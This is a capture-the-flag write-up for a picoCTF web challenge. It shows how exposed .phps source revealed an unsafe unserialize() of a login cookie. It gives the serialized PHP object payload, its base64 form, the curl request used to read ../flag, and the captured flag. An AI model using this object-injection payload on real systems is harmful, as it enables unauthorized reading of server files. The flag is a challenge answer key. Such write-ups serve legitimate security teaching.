# Overview 
Category: [Web Exploitation]()

AUTHOR: MADSTACKS

# Description
Try to recover the flag stored on this website http://mercury.picoctf.net:42449/

# Solution
- Going to robots.txt shows that admin.phps is disallowed 
<img src="https://i.imgur.com/5SCkbac.png">

=>  This indicates that the phps extension is enabled within the php configuration for this webserver
- We try access index.phps :
<img src="https://i.imgur.com/8iekRpF.png">

- The above php code points us in the direction of authentication.phps
<img src="https://i.imgur.com/2OSnjQl.png">

- View cookie.phps
```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
- Focus : ```$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])))```
=> I think of the unserialize vulnerability
Read [it](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection#:~:text=The%20vulnerability%20occurs%20when%20user-supplied%20input%20is%20not,PHP%20object%20%28s%29%20injection%20into%20the%20application%20scope)
- Based on the code:
```
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```
=> The php serialized access_log object looks like this: 
```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```
(base hint : The flag is at ../flag)
- Encode base64
```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
- I  access the authentication.php file with the correct cookie set: 
```
curl http://mercury.picoctf.net:42449/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
```
- Results:
```
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}
```

> Flag :**picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}**